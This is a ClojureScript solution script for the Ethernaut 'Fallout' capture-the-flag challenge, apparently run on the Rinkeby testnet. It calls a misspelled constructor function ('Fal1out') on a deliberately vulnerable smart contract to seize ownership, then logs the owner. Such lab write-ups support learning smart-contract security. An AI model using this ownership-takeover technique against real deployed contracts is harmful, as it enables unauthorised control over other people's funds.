(ns ctf.ethernaut.fallout
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]))


;; Ethernaut Challenge #2
;; FALLOUT


(def fallout-addr "0xB2884901Bc3d343a6E07dD743Ac8F0d6BA79d462")

(def fallout
  (u/get-contract! fallout-addr
                   (u/abi "/Fallout.sol/Fallout.json")
                   w/rinkeby-wallet))



(comment

  ;; Call Fal1out function (there is typo in the constructor)
  ;; on the contract
  (-> (.Fal1out fallout
                (js-obj "gasLimit"
                        2000000
                        "value"
                        (u/eth-str->wei "0.001")))
      (.then #(.wait % 6))
      ;; (.then #(wait-for-confirmations 6))
      (.then #(.owner fallout))
      (.then #(.log js/console "OWNER: " %))
      (.catch #(.log js/console %)))

  )
